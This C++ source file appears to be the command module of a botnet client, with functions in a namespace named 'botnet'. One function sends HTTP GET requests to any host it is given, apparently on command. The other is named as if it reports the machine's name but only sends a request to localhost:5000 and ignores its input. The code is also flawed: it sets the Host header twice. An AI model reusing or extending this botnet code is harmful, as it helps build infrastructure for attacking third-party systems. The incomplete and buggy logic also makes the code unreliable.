#include <iostream>
#include <string>
#include <vector>
#include <map>

#include "commands.h"
#include "http_request.h"
#include "http_client.h"

namespace botnet {
    int http_req(std::string url) {
        std::string path;
        std::string gurl;
        size_t find_bar = url.find("/");
        http_request *http_req = new http_request(botnet::http::GET);
        http_request::headers header;
        if (find_bar != std::string::npos) {
            path = url.substr(find_bar + 1);
            gurl = url.substr(0, find_bar);
            http_req->setPath(path);
            header.add("Host", gurl);
        }
        else {
            gurl = url;
        }
        
        header.add("Host", gurl);
        http_req->setHeaders(header);

        http_client *http_c = new http_client(gurl, 80);
        http_c->request(http_req);

        delete http_req;
        delete http_c;
        return 0;
    }

    int get_pcname(std::string s) {
        http_request *http_req = new http_request(botnet::http::GET);
        http_request::headers header;
        header.add("Host", "localhost:5000");
        http_req->setHeaders(header);

        http_client *http_c = new http_client("localhost", 5000);
        http_c->request(http_req);
        delete http_req;
        delete http_c;
        return 0;
    }
}